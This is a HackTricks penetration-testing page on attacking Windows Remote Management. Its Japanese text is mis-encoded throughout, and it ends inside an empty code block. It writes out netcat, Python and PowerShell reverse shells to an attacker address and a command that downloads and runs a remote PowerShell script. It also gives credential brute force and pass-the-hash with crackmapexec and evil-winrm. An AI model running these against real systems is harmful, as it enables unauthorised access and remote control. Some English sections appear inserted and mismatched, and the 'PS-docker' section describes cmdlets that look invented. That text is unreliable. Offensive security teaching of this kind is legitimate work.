# 5985,5986 - WinRMã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ï¼ˆWinRMï¼‰ã¯ã€SOAPã‚’ä½¿ç”¨ã—ã¦HTTPï¼ˆSï¼‰çµŒç”±ã§Windowsãƒã‚·ãƒ³ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§ç®¡ç†ã™ã‚‹ãŸã‚ã®Microsoftãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ã¯WMIã‚’åˆ©ç”¨ã—ã¦ã„ã‚‹ãŸã‚ã€WMIã®HTTPãƒ™ãƒ¼ã‚¹ã®APIã¨è€ƒãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

WinRMãŒãƒã‚·ãƒ³ã§æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€PowerShellã‹ã‚‰ç°¡å˜ã«ãƒã‚·ãƒ³ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§ç®¡ç†ã§ãã¾ã™ã€‚å®Ÿéš›ã«ã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã®PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒã‚·ãƒ³ã«ãƒ‰ãƒ­ãƒƒãƒ—ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆSSHã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã«ï¼‰ã€‚

WinRMãŒåˆ©ç”¨å¯èƒ½ã‹ã©ã†ã‹ã‚’æ¤œå‡ºã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã¯ã€ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ã€‚WinRMã¯æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒãƒ¼ãƒˆã§ãƒªãƒƒã‚¹ãƒ³ã—ã¾ã™ï¼š

* **5985/tcpï¼ˆHTTPï¼‰**
* **5986/tcpï¼ˆHTTPSï¼‰**

ã“ã‚Œã‚‰ã®ãƒãƒ¼ãƒˆã®ã„ãšã‚Œã‹ãŒé–‹ã„ã¦ã„ã‚‹å ´åˆã€WinRMãŒæ§‹æˆã•ã‚Œã¦ãŠã‚Šã€ãƒªãƒ¢ãƒ¼ãƒˆã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

## **WinRMã‚»ãƒƒã‚·ãƒ§ãƒ³ã®é–‹å§‹**.

PowerShellã‚’WinRMã¨é€£æºã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Microsoftã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€Enable-PSRemotingã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚’PowerShellãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒãƒ³ãƒ‰ã‚’å—ã‘å–ã‚‹ã‚ˆã†ã«æ§‹æˆã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã§ã™ã€‚è¢«å®³è€…ã®ã‚¨ãƒ¬ãƒ™ãƒ¼ãƒˆã•ã‚ŒãŸPowerShellãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ã“ã‚Œã‚’æœ‰åŠ¹ã«ã—ã€ä»»æ„ã®ã€Œæ”»æ’ƒè€…ã€ã‚’ä¿¡é ¼ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã¨ã—ã¦è¿½åŠ ã§ãã¾ã™ã€‚æ¬¡ã®2ã¤ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ã“ã‚Œã«ã‚ˆã‚Šã€trustedhostsè¨­å®šã«ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ãŒè¿½åŠ ã•ã‚Œã¾ã™ã€‚ãã‚ŒãŒä½•ã‚’æ„å‘³ã™ã‚‹ã‹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ _æ³¨æ„: æ”»æ’ƒãƒã‚·ãƒ³ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¿ã‚¤ãƒ—ã‚’ã€ŒPublicã€ã‹ã‚‰ã€ŒWorkã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚_

ã¾ãŸã€_wmic_ã‚’ä½¿ç”¨ã—ã¦ã€WinRMã‚’**ãƒªãƒ¢ãƒ¼ãƒˆã§ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ãƒˆ**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### è¨­å®šã®ãƒ†ã‚¹ãƒˆ

æ”»æ’ƒãƒã‚·ãƒ³ãŒè¨­å®šã•ã‚ŒãŸã‚‰ã€`Test-WSMan` é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒ WinRM ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨ wsmid ã«é–¢ã™ã‚‹æƒ…å ±ãŒè¿”ã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

ã“ã®å ´åˆã€æœ€åˆã®ã‚‚ã®ã¯è¨­å®šã•ã‚Œã¦ãŠã‚Šã€2ç•ªç›®ã®ã‚‚ã®ã¯è¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚

### ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ

ã“ã‚Œã§ã€PowerShell ã® `Invoke-Command` ã‚’ä½¿ç”¨ã—ã¦ã€WinRM ã‚’ä»‹ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆä¸Šã§ã‚³ãƒãƒ³ãƒ‰ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚`ipconfig` ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§å®Ÿè¡Œã—ã¦å‡ºåŠ›ã‚’ç¢ºèªã—ã¾ã™ã€‚
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

ã¾ãŸã€**Invoke-Command**ã‚’ä½¿ç”¨ã—ã¦ã€ç¾åœ¨ã®PSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã«_**enumeration**_ã¨ã„ã†é–¢æ•°ãŒã‚ã‚‹ã¨ä»®å®šã—ã€ãã‚Œã‚’ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§å®Ÿè¡Œã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œ

To execute a script on a target machine using WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote machines.

```powershell
Invoke-Command -ComputerName <target> -ScriptBlock {<script>}
```

Replace `<target>` with the IP address or hostname of the target machine, and `<script>` with the script you want to execute.

For example, to execute a PowerShell script named `script.ps1` on a target machine with the IP address `192.168.1.100`, you would use the following command:

```powershell
Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock {.\script.ps1}
```

This will execute the `script.ps1` script on the target machine.

Keep in mind that you may need to provide valid credentials to authenticate with the target machine if you are not already authenticated. You can use the `-Credential` parameter to specify the credentials to use.

```powershell
Invoke-Command -ComputerName <target> -Credential <credentials> -ScriptBlock {<script>}
```

Replace `<credentials>` with the appropriate credentials for the target machine.

Remember to ensure that you have the necessary permissions to execute scripts on the target machine.
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### é€†ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹

To get a reverse shell, you can use the following methods:

1. **Netcat**: Use the `nc` command to establish a reverse shell connection. For example:
   ```
   nc -e /bin/sh <attacker_ip> <attacker_port>
   ```

2. **Python**: Utilize the `socket` library in Python to create a reverse shell. Here is an example code snippet:
   ```python
   import socket,subprocess,os
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("<attacker_ip>",<attacker_port>))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(["/bin/sh","-i"])
   ```

3. **PowerShell**: Use PowerShell to establish a reverse shell connection. Here is an example command:
   ```powershell
   powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<attacker_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   ```

Remember to replace `<attacker_ip>` with your IP address and `<attacker_port>` with the port you want to use for the reverse shell connection.
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PSã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å–å¾—

ã¾ãŸã¯ã€å¯¾è©±å‹ã®PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ç›´æ¥å…¥ã‚‹å ´åˆã¯ã€`Enter-PSSession`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ã€ã€Œè¢«å®³è€…ã€å†…ã®æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆwsmprovhostï¼‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™**

### **WinRMã‚’å¼·åˆ¶çš„ã«é–‹ã**

PSãƒªãƒ¢ãƒ¼ãƒˆãŠã‚ˆã³WinRMã‚’ä½¿ç”¨ã—ãŸã„ãŒã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒãã‚Œã«è¨­å®šã•ã‚Œã¦ã„ãªã„å ´åˆã€å˜ä¸€ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€Œå¼·åˆ¶çš„ã«ã€é–‹ãã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ãŠå‹§ã‚ã—ã¾ã›ã‚“ãŒã€æœ¬å½“ã«WinRMã¾ãŸã¯PSãƒªãƒ¢ãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ãŸã„å ´åˆã¯ã€ã“ã®æ–¹æ³•ã§è¡Œã£ã¦ãã ã•ã„ã€‚ãŸã¨ãˆã°ã€PSExecã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
çŠ ç‰²è€…ã®ãƒªãƒ¢ãƒ¼ãƒˆPSã‚»ãƒƒã‚·ãƒ§ãƒ³ã«å…¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¿å­˜ã¨å¾©å…ƒ

ã“ã‚Œã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§è¨€èªãŒåˆ¶ç´„ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ã“ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§ã¯ã€_Invoke-Command_ã‚’ä½¿ç”¨ã—ã¦PSã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚¨ãƒ©ãƒ¼ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆï¼š

`enter-pssession : ãƒªãƒ¢ãƒ¼ãƒˆ ã‚µãƒ¼ãƒãƒ¼ 10.10.10.175 ã¸ã®æ¥ç¶šã«å¤±æ•—ã—ã¾ã—ãŸã€‚æ¬¡ã®ã‚¨ãƒ©ãƒ¼ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸ: WinRM ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯è¦æ±‚ã‚’å‡¦ç†ã§ãã¾ã›ã‚“ã€‚èªè¨¼ã‚¹ã‚­ãƒ¼ãƒ ãŒ Kerberos ã¨ç•°ãªã‚‹å ´åˆã€ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«å‚åŠ ã—ã¦ã„ãªã„å ´åˆã€HTTPS ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€ã¾ãŸã¯å®›å…ˆãƒã‚·ãƒ³ã‚’ TrustedHosts æ§‹æˆè¨­å®šã«è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚TrustedHosts ã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€winrm.cmd ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚TrustedHosts ãƒªã‚¹ãƒˆã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã¯èªè¨¼ã•ã‚Œã¦ã„ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã®ã§ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦è©³ç´°æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™: winrm help configã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€about_Remote_Troubleshooting ãƒ˜ãƒ«ãƒ— ãƒˆãƒ”ãƒƒã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚`

ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ä»¥ä¸‹ã®è©¦ã¿ã‚’è¡Œã„ã¾ã™ï¼ˆ[ã“ã“](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ã®æƒ…å ±ã‹ã‚‰ï¼‰ï¼š
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±é…¬ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## Linuxã§ã®WinRMæ¥ç¶š

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

æ³¨æ„ï¼šWinRMã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrmã®ä½¿ç”¨

evil-winrmã¯ã€Windows Remote Managementï¼ˆWinRMï¼‰ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚WinRMã¯ã€Windowsãƒã‚·ãƒ³é–“ã§ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ã‚’å¯èƒ½ã«ã™ã‚‹ãŸã‚ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚evil-winrmã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€WinRMã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦èªè¨¼æƒ…å ±ã‚’æä¾›ã—ã€ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚·ãƒ³ã«å¯¾ã—ã¦æ¨©é™ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€evil-winrmã®ä½¿ç”¨æ–¹æ³•ã®ä¾‹ã§ã™ã€‚

1. evil-winrmã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

   ```
   evil-winrm -i <target-ip> -u <username> -p <password>
   ```

   - `<target-ip>`ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã§ã™ã€‚
   - `<username>`ã¯ã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼åã§ã™ã€‚
   - `<password>`ã¯ã€æœ‰åŠ¹ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã™ã€‚

2. ä¸Šè¨˜ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€evil-winrmãŒWinRMã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã—ã€èªè¨¼æƒ…å ±ã‚’æä¾›ã—ã¾ã™ã€‚

3. èªè¨¼ãŒæˆåŠŸã™ã‚‹ã¨ã€evil-winrmã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ã‚·ã‚§ãƒ«ãŒé–‹ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚·ãƒ³ä¸Šã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è»¢é€ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

evil-winrmã¯ã€WinRMã‚µãƒ¼ãƒ“ã‚¹ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦æ¨©é™ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ãŸã ã—ã€æ‚ªç”¨ã«ã¯æ³¨æ„ãŒå¿…è¦ã§ã‚ã‚Šã€æ­£å½“ãªç›®çš„ã§ã®ã¿ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```ruby
gem install evil-winrm
```
æ¬¡ã®ãƒªãƒ³ã‚¯ã‹ã‚‰ã€ãã®githubã®**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**ã‚’èª­ã‚“ã§ãã ã•ã„: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
**IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹**ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«evil-winrmã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«**ãƒ‰ãƒ¡ã‚¤ãƒ³å**ã‚’è¨­å®šã™ã‚‹ãŸã‚ã«_**/etc/hosts**_å†…ã«ã‚¨ãƒ³ãƒˆãƒªã‚’ä½œæˆã—ã€ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«æ¥ç¶šã—ã¾ã™ã€‚

### evil-winrmã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚·ãƒ¥ã‚’ãƒ‘ã‚¹ã™ã‚‹
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### PS-dockerãƒã‚·ãƒ³ã®ä½¿ç”¨

PS-docker is a PowerShell module that allows you to manage Docker containers and images using PowerShell commands. It provides a convenient way to interact with Docker without having to use the Docker CLI.

To use PS-docker, you first need to install the module on your machine. You can do this by running the following command in a PowerShell session:

```powershell
Install-Module -Name PS-docker
```

Once the module is installed, you can use the `Connect-Docker` command to connect to a Docker host. This command takes the IP address or hostname of the Docker host as a parameter. For example:

```powershell
Connect-Docker -Host 192.168.1.100
```

After connecting to the Docker host, you can use various commands provided by the PS-docker module to manage containers and images. Some commonly used commands include:

- `Get-DockerContainer`: Retrieves information about running containers.
- `New-DockerContainer`: Creates a new container.
- `Start-DockerContainer`: Starts a stopped container.
- `Stop-DockerContainer`: Stops a running container.
- `Remove-DockerContainer`: Removes a container.
- `Get-DockerImage`: Retrieves information about available images.
- `Pull-DockerImage`: Downloads an image from a Docker registry.
- `Build-DockerImage`: Builds a new image from a Dockerfile.

These are just a few examples of the commands available in the PS-docker module. You can explore the full list of commands and their usage by running the `Get-Command -Module PS-docker` command.

Using PS-docker can be particularly useful when performing penetration testing on systems that have Docker installed. It allows you to easily manage containers and images, which can be helpful for testing and exploiting vulnerabilities in Dockerized applications.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ãƒ«ãƒ“ãƒ¼ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹

ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã¯ã“ã¡ã‚‰ã‹ã‚‰æŠ½å‡ºã•ã‚Œã¾ã—ãŸ: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)
```ruby
